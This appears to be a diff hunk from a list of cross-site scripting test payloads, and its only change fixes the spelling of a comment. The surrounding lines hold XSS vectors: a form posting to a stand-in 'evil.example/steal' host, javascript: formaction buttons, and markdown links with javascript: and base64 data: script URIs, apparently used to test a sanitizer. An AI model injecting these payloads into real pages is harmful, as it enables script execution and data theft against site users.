@@ -50,7 +50,7 @@
 <form action="https://evil.example/steal"><input type=submit></form>
 <button formaction="javascript:alert(1)">x</button>
 <form><button formaction=javascript:alert(1)>x</button></form>
-# markdown flavoured
+# markdown flavored
 [x](javascript:alert(1))
 ![x](javascript:alert(1))
 [x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
